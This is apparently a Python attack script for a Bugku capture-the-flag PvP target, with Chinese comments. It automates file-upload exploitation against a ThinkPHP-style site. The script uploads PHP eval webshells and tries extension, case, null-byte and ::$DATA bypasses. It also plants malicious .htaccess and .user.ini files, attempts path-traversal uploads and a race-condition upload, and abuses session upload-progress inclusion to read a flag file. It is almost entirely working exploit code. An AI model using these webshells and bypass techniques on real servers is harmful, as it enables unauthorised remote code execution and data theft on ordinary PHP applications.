#!/usr/bin/env python3
"""Team 117 文件上传分析 + Webshell利用"""
import requests
import os
import time
import re
import urllib.parse

HOST = "192-168-1-117.pvp7574.bugku.cn"
BASE = f"http://{HOST}"

def upload_file(filename, content, mime="image/jpeg", field="file", extra_data=None):
    """上传文件并返回响应"""
    files = {field: (filename, content, mime)}
    data = extra_data or {}
    try:
        r = requests.post(
            f"{BASE}/index.php?m=Home&c=Upload&a=index",
            files=files,
            data=data,
            timeout=10
        )
        return r.text, r.status_code
    except Exception as e:
        return f"ERROR: {e}", 0

def get_upload_path(response):
    """从响应中提取上传路径"""
    m = re.search(r'(upload/\w+\.\w+)', response)
    return m.group(1) if m else None

def test_access(url_path):
    """测试访问上传的文件"""
    try:
        r = requests.get(f"{BASE}/{url_path}", timeout=8, allow_redirects=False)
        return r.status_code, len(r.content), r.text[:300]
    except Exception as e:
        return 0, 0, str(e)

def main():
    print("=" * 60)
    print("  Team 117 文件上传深度分析")
    print("=" * 60)

    # ========= 1. 分析上传参数 =========
    print("\n[1] 分析上传机制")
    print("-" * 40)

    # 测试各种字段名
    for field in ["file", "upload", "upfile", "pic", "image", "Filedata", "avatar"]:
        resp, code = upload_file("test.jpg", b"\xff\xd8\xff\xe0test", field=field)
        path = get_upload_path(resp)
        if path:
            print(f"  字段 {field}: ✅ 成功 -> {path}")
        else:
            print(f"  字段 {field}: ❌ 失败")

    print()

    # ========= 2. 上传各种扩展名 =========
    print("\n[2] 测试各种扩展名 + 访问")
    print("-" * 40)

    shell_content = b'<?php echo "SHELL_OK!";@eval($_POST["cmd"]);?>'

    extensions = [
        # PHP 相关
        ("php", shell_content, "image/jpeg"),
        ("php5", shell_content, "image/jpeg"),
        ("php4", shell_content, "image/jpeg"),
        ("php3", shell_content, "image/jpeg"),
        ("phtml", shell_content, "image/jpeg"),
        ("pht", shell_content, "image/jpeg"),
        ("phar", shell_content, "image/jpeg"),
        # 其他可执行
        ("pl", b"#!/usr/bin/perl\nprint 'OK';\n", "text/plain"),
        ("py", b"#!/usr/bin/env python3\nprint('OK')\n", "text/plain"),
        ("cgi", b"#!/bin/bash\necho Content-type: text/html\necho\necho OK\n", "text/plain"),
        ("sh", b"#!/bin/bash\necho OK\n", "text/plain"),
        # 大小写绕过
        ("Php", shell_content, "image/jpeg"),
        ("pHp", shell_content, "image/jpeg"),
        ("PHP", shell_content, "image/jpeg"),
        ("pHp5", shell_content, "image/jpeg"),
        # 双写绕过
        ("php.jpg", shell_content, "image/jpeg"),
        ("jpg.php", shell_content, "image/jpeg"),
        ("php.jpg.php", shell_content, "image/jpeg"),
        ("php%00.jpg", shell_content, "image/jpeg"),
        # 空字节绕过
        ("php\x00.jpg", shell_content, "image/jpeg"),
        # 点号绕过
        ("php.", shell_content, "image/jpeg"),
        ("php..", shell_content, "image/jpeg"),
        ("php.", shell_content, "image/jpeg"),
        # 空格绕过
        ("php ", shell_content, "image/jpeg"),
        # ::$DATA (Windows)
        ("php::$DATA", shell_content, "image/jpeg"),
    ]

    results = {}
    for ext, content, mime in extensions:
        filename = f"test.{ext}"
        resp, _ = upload_file(filename, content, mime=mime)
        path = get_upload_path(resp)
        if path:
            status, length, body = test_access(path)
            has_shell = "SHELL_OK" in body
            is_html = "<!DOCTYPE" in body or "<html" in body
            results[ext] = (path, status, has_shell, is_html)
            if has_shell:
                print(f"  ✅ .{ext}: {path} -> 状态{status} | SHELL_EXEC!")
            elif status == 200 and not is_html:
                print(f"  ⚠️  .{ext}: {path} -> 状态{status} | {length}字节非HTML")
            else:
                print(f"  ❌ .{ext}: {path} -> 状态{status} | 被拦截")
        else:
            print(f"  ❌ .{ext}: 上传被拒绝")

    print()

    # ========= 3. .htaccess 上传 =========
    print("\n[3] .htaccess 绕过")
    print("-" * 40)

    # 各种.htaccess配置
    htaccess_variants = [
        # 添加MIME类型
        ("AddType application/x-httpd-php .jpg .png .gif", "image/jpeg"),
        # 自定义处理器
        ("AddHandler application/x-httpd-php .jpg", "image/jpeg"),
        ("SetHandler application/x-httpd-php", "image/jpeg"),
        ("php_value auto_append_file /app/upload/test.jpg", "image/jpeg"),
        # mod_rewrite 重写
        ("""
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule test\\.jpg$ test.php [L]
</IfModule>
""", "image/jpeg"),
        # 上传.htaccess + 改名绕过
        ("AddType application/x-httpd-php .txt", "text/plain"),
    ]

    for i, (htcontent, mime) in enumerate(htaccess_variants):
        htname = ".htaccess" if i == 0 else f".htaccess{i}"
        resp, _ = upload_file(htname, htcontent.encode(), mime=mime)
        path = get_upload_path(resp)
        print(f"  .htaccess变体{i}: {path or '上传失败'}")

    # 上传一个.jpg但内容是PHP的（配合AddType）
    jpg_content = b'GIF89a<?php echo "JPG_OK!";@eval($_POST["cmd"]);?>'
    resp, _ = upload_file("shell.jpg", jpg_content, mime="image/jpeg")
    jpg_path = get_upload_path(resp)
    if jpg_path:
        status, length, body = test_access(jpg_path)
        # 尝试通过.php访问
        php_status, _, php_body = test_access(jpg_path.replace(".jpg", ".php"))
        print(f"  jpg马 {jpg_path}: 直接访问={status} OK={('JPG_OK' in body)}")
        if php_status == 200:
            print(f"  jpg->php: {php_status} OK={('JPG_OK' in php_body)}")

    print()

    # ========= 4. .user.ini 上传 =========
    print("\n[4] .user.ini 绕过 (CGI/FastCGI)")
    print("-" * 40)

    userini_variants = [
        "auto_prepend_file=shell.jpg",
        "auto_append_file=/etc/passwd",
        "auto_prepend_file=../../upload/shell.jpg",
        """auto_prepend_file="a"
auto_append_file="b"
""",
    ]

    for i, ui_content in enumerate(userini_variants):
        resp, _ = upload_file(".user.ini", ui_content.encode(), mime="text/plain")
        path = get_upload_path(resp)
        print(f"  .user.ini变体{i}: {path or '失败'}")

    print()

    # ========= 5. 路径遍历上传 =========
    print("\n[5] 路径遍历上传 (到可执行目录)")
    print("-" * 40)

    traversal_paths = [
        "../../Runtime/Cache/test.php",      # ThinkPHP缓存目录
        "../../Runtime/Logs/test.php",       # 日志目录
        "../../Runtime/Temp/test.php",       # 临时目录
        "../../Runtime/Data/test.php",       # 数据目录
        "../../App/Runtime/Cache/test.php",
        "../../Public/test.php",
        "../../Data/test.php",
        "../../../app/Runtime/Cache/test.php",
    ]

    shell = b'<?php echo "TRAVERSAL_OK";@eval($_POST["c"]);?>'
    for tra in traversal_paths:
        # 构造遍历文件名
        parts = tra.split("/")
        filename = parts[-1]
        prefix = "../" * (len(parts) - 1) if len(parts) > 1 else ""
        full_name = f"{prefix}{parts[-2]}/{filename}" if len(parts) > 1 else filename

        # 方式1: 文件名里包含../
        resp, _ = upload_file(tra, shell, mime="image/jpeg")
        path = get_upload_path(resp)
        if path:
            print(f"  {tra[:40]}... -> 上传: {path}")
            # 尝试各种可能的位置访问
            for access in [tra, f"Runtime/Cache/{filename}", f"upload/{parts[-1]}"]:
                st, _, bd = test_access(access)
                if st == 200 and "TRAVERSAL_OK" in bd:
                    print(f"    ✅ 访问成功: {access}")

        # 方式2: 额外POST参数传递路径
        for pparam in ["save_path", "path", "filepath", "savepath", "dir", "uploadpath"]:
            resp, _ = upload_file(filename, shell, extra_data={pparam: tra})
            path = get_upload_path(resp)
            if path and "upload" not in path:
                print(f"  参数{pparam}={tra[:30]}: -> {path}")

    print()

    # ========= 6. 竞争条件上传 =========
    print("\n[6] 竞争条件上传 (Race Condition)")
    print("-" * 40)

    # 先上传临时文件，在删除前访问
    import threading
    import concurrent.futures

    shell = b'<?php echo "RACE_OK";?>'
    success = {"found": False}

    def upload_thread():
        for _ in range(10):
            upload_file(f"race_{int(time.time()*1000)}.php", shell)

    def access_thread():
        for i in range(100):
            for n in range(1, 20):
                st, _, bd = test_access(f"upload/race_{n}.php")
                if st == 200 and "RACE_OK" in bd:
                    success["found"] = True
                    print(f"    ✅ 竞争成功: upload/race_{n}.php")
                    return
            time.sleep(0.05)

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        ex.submit(access_thread)
        ex.submit(upload_thread)
        ex.submit(access_thread)
        ex.submit(upload_thread)

    if not success["found"]:
        print("  竞争条件未成功")

    print()

    # ========= 7. 上传到不同目录 =========
    print("\n[7] 测试不同上传目录 + URL")
    print("-" * 40)

    if results.get("php"):
        base_path = results["php"][0]  # upload/xxx.php
        print(f"  基础路径: {base_path}")

        # 尝试各种URL访问方式
        url_tests = [
            base_path,
            base_path.replace("upload/", "Uploads/"),
            base_path.replace("upload/", "uploads/"),
            base_path.replace("upload/", "data/upload/"),
            base_path.replace("upload/", "Data/upload/"),
            base_path.replace("upload/", "Public/Uploads/"),
            base_path.replace("upload/", "Public/uploads/"),
            f"../{base_path}",
            f"./{base_path}",
            f"/{base_path}",
            f"index.php/{base_path}",
            f"?s=/{base_path}",
            # ThinkPHP路由方式访问
            f"index.php?m=Home&c=File&a=download&file={os.path.basename(base_path)}",
        ]

        for url in url_tests:
            try:
                r = requests.get(f"{BASE}/{url}" if not url.startswith("/") else f"{BASE}{url}", timeout=5)
                if "SHELL_OK" in r.text:
                    print(f"    ✅ 可执行: {url}")
                elif r.status_code == 200 and "<!DOCTYPE" not in r.text:
                    print(f"    ⚠️  200非HTML: {url} ({len(r.content)}字节)")
            except:
                pass

    print()

    # ========= 8. Session上传包含 =========
    print("\n[8] Session 上传进度包含")
    print("-" * 40)

    # PHP 5.4+ session.upload_progress
    # 尝试触发session文件写入
    session = requests.Session()
    sess_name = "PHPSESSID"
    sess_id = "team117test" + str(int(time.time()))

    # 构造一个上传但不完成的请求，写入session
    payload = "---RANDOM\r\n"
    payload += f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    payload += "<?php echo file_get_contents('/flag'); ?>\r\n"
    payload += '---RANDOM\r\n'
    payload += 'Content-Disposition: form-data; name="test"; filename="big.bin"\r\n'
    payload += 'Content-Type: application/octet-stream\r\n\r\n'
    payload += "A" * 100000  # 大文件延迟
    payload += "\r\n---RANDOM--"

    try:
        # 发送请求 (设置较长超时但不用等完成)
        r = session.post(
            f"{BASE}/index.php",
            headers={
                "Content-Type": "multipart/form-data; boundary=---RANDOM",
                "Cookie": f"{sess_name}={sess_id}",
            },
            data=payload,
            timeout=2
        )
    except:
        pass

    # 尝试包含session文件
    sess_file = f"/tmp/sess_{sess_id}"
    session_includes = [
        f"/var/lib/php5/sess_{sess_id}",
        f"/tmp/sess_{sess_id}",
        f"/var/lib/php/session/sess_{sess_id}",
    ]
    for sf in session_includes:
        # ThinkPHP包含 + 路径遍历
        for c in range(5):
            traverse = "../" * c + sf.lstrip("/")
            st, _, bd = test_access(f"index.php?m=Home&c=Index&a=index&name={traverse}")
            if "flag{" in bd:
                print(f"  ✅ Session包含成功: {sf}")
                print(f"    flag: {re.search(r'flag\{[^}]+\}', bd).group()}")

    print("  Session测试完成")

    print()
    print("=" * 60)
    print("  分析完成")
    print("=" * 60)

if __name__ == '__main__':
    main()
